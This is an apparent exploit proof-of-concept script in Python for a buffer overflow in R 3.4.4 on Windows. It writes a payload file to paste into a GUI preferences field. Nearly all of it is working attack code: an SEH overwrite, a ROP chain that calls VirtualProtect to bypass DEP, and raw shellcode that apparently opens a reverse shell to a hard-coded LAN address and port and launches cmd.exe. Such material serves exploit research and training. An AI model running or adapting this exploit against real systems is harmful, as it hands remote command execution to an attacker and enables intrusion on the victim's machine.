#!/usr/bin/python
# Custom pratice for Exploit Title: R 3.4.4 (Windows 10 x64) - Buffer Overflow  SEH(DEP/ASLR Bypass)
# discovered by: bzyo

# Exploit Author Windows 10 Home Single x64: blackleitus
# Exploit Author Windows 11 Pro 22H2: Freshnuts(blackleitus exploit template)

# Date: 2024-09-10

# GUI Preferences -> paste payload.txt into 'Language for menus ...' -> click OK
import struct
import sys
from struct import pack, unpack

outfile = 'payload.txt'


# Overflow
# SEH bypass
# ROP DEP Bypass
# Jmp to Shellcode

# Obtained pointers through .exe & dll's that don't have ASLR enabled.

def create_rop_gadgets():
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x6c996ce3,  # POP ECX # RETN [R.dll] 
      0x6e732b50,  # ptr to &VirtualProtect() [IAT R.dll]
      0x6cc02060,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [R.dll] 
      0x6cb14df6,  # XCHG EAX,ESI # RETN [R.dll] 
      
      #[---INFO:gadgets_to_set_ebp:---]
      0x6c97f8da,  # POP EBP # RETN [R.dll] 
      0x6ca477ed,  # & jmp esp [R.dll]
      
      #[---INFO:gadgets_to_set_ebx:---]
      0x6cae553c,  # POP EBX # RETN [R.dll] 
      0xfffffdff,  # 0x00000201-> ebx           
      0x6c94e84f,  # xchg eax, ebx ; ret ; (1 found)
      0x6c91e159,  # neg eax ; ret ; (1 found)
      0x6c94e84f,  # xchg eax, ebx ; ret ; (1 found)
      
        # avoided bad chars '\x00' by sending 0xfffffdff instead of 0x00000201
        # Goal: Revert 0xfffffdff back to 0x201 with [neg eax]
        # [xchg eax, ebx]
        # [neg eax] revert back to 0x201 using [neg eax]
        # [xchg eax, ebx] 

      #[---INFO:gadgets_to_set_edx:---]
      0x6c94c532,  # POP EDX # RETN [R.dll]     
      0xffffffc0,  # 0x00000040-> edx
      0x6c96a376,  # xchg eax, edx ; ret ; (1 found)
      0x6c91e159,  # neg eax ; ret ; (1 found)
      0x6c96a376,  # xchg eax, edx ; ret ; (1 found)

        # avoided bad chars '\x00' by sending 0xffffffc0 instead of 0x00000040
        # Goal: Revert 0xffffffco back to 0x40 with [neg eax]
        # [xchg eax, ebx] to revert 0xffffffc0 back to 0x40
        # revert back to 0x40 using [neg eax]
        # [xchg eax, ebx]
      
      #[---INFO:gadgets_to_set_ecx:---]
      0x6cbe90a8,  # POP ECX # RETN [R.dll] 
      0x6e735a21,  # &Writable location [R.dll]
      
      #[---INFO:gadgets_to_set_edi:---]
      0x6c903cc5,  # POP EDI # RETN [R.dll] 
      0x6c91e15b,  # RETN (ROP NOP) [R.dll]
      
      #[---INFO:gadgets_to_set_eax:---]
      0x6cbef3c0,  # POP EAX # RETN [R.dll] 
      0x90909090,  # nop
      
      #[---INFO:pushad:---]
      0x6cacc7ea,  # PUSHAD # RETN [R.dll]
      
    ]
    return b"".join([pack("<L", r) for r in rop_gadgets])

rop_chain = create_rop_gadgets()

# bad chars = 00 0d
shellcode = b'\x89\xe5\xb8\xf0\xf9\xff\xffk\xc0\x01\x01\xc4\xeb\x06^\x89u\x04\xebP\xe8\xf5\xff\xff\xff`1\xc9d\x8bq0\x8bv\x0c\x8bv\x1cV\x8b^\x08\x0f\xb6F\x1e\x89E\xf8\x8bC<\x8b|\x03x\x01\xdf\x8bO\x18O\x8bG!G\x01\xd8\x89E\xfc\xe3\x1dI\x8bE\xfc\x8b4\x88\x01\xde1\xc0\x8bU\xf8\xfc\xac\x84\xc0t\x0e\xc1\xca\x03\x01\xc2\xeb\xf4\xeb+^\x8b6\xeb\xbb;T$(u\xd6\x8bW$\x01\xdaf\x8b\x0cJ\x8bW\x1c\x01\xda\x8b\x04\x8a\x01\xd8L\x89D$!D^aYZQ\xff\xe0\xb8\xb4\xb3\xff\xfe\xf7\xd8Ph32.DhWS2_ThU\x12\x81\xc0\xffU\x04\x89\xe01\xc9f\xb9\x90\x05)\xc8P1\xc0f\xb8\x02\x02Ph\xb8&\x0f\xb0\xffU\x041\xc0PPP\xb0\x06P,\x05P@Ph\x89&\xa5P\xffU\x04\x89\xc61\xc0PPh\xc0\xa8\x01nf\xb8\x11[\xc1\xe0\x10f\x83\xc0\x02PT_1\xc0PPPP\x04\x10PWVh\xba&\xd12\xffU\x04VVV1\xc0H\x8dH\x0e@P\xe2\xfd\xb0DPT_f\xc7G,\x01\x01\xb8\x9b\x87\x9a\xff\xf7\xd8Phcmd.\x89\xe3\x89\xe01\xc9f\xb9\x90\x03)\xc8PW1\xc0PPP@PHPPSPh\x8fu-\x92\xffU\x041\xc9Qj\xffh\x97\xaae}\xffU\x04'

junk = b"A" * 1024
nseh  = struct.pack("<L", 0x0eeb9090) # 42424242 (BBBB) next SEH record
seh   = struct.pack("<L", 0x6c998dce) # 43434343 (CCCC) current SEH record
                                      # EIP lands here first

add_esp = struct.pack("<L", 0x6c90b9c8) # add esp, 0x0000076C ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret


# Rop chain gets interrupted after a few bytes if
# if we don't move ESP. (add esp instruction)
# Perform ropchain at a different location.
payload  = b""          # Payload execution order
payload += junk         # 1 padding
payload += nseh         # 3 eip -> nseh
payload += seh          # 2 eip
payload += add_esp      # 4 nseh -> add_esp
payload += b"C"* 88     # padding for esp to land on rop_chain
payload += rop_chain    # 5 add_esp -> rop_chain
payload += shellcode    # 6 rop_chain -> shellcode

with open(outfile, 'wb') as file:
  file.write(payload)
print("payload File Created\n")
            
            
